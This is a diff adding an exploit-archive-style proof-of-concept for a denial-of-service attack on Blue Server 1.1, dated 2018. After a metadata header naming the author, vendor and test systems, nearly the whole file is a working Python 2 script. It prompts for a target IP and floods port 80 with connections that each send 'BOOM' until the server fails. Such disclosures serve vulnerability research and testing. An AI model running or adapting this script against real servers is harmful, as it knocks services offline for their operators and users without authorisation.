@@ -1,0 +1,46 @@
+# Exploit Title: Blue Server 1.1 - Denial of Service (PoC)
+# Dork: N/A
+# Date: 2018-11-02
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://www.mafiatic.org/
+# Software Link: https://master.dl.sourceforge.net/project/blueserver/Blue-Server-1.1.exe
+# Version: 1.1
+# Category: Dos
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+
+#!/usr/bin/python
+import socket
+
+print """
+         \\\|///
+       \\  - -  //
+        (  @ @ )
+ ----oOOo--(_)-oOOo----
+ Blue Server 1.1 Dos
+    Ihsan Sencan
+ ---------------Ooooo----
+                (   )
+       ooooO     ) /
+       (   )    (_/
+        \ (
+         \_)
+"""
+Ip = raw_input("[Ip]: ")
+Port = 80 # Default port
+ 
+d=[]
+c=0
+while 1:
+    try:
+        d.append(socket.create_connection((Ip,Port)))
+        d[c].send("BOOM")
+        print "Sie!"
+        c+=1
+    except socket.error: 
+        print "Done!"
+        raw_input()
+        break
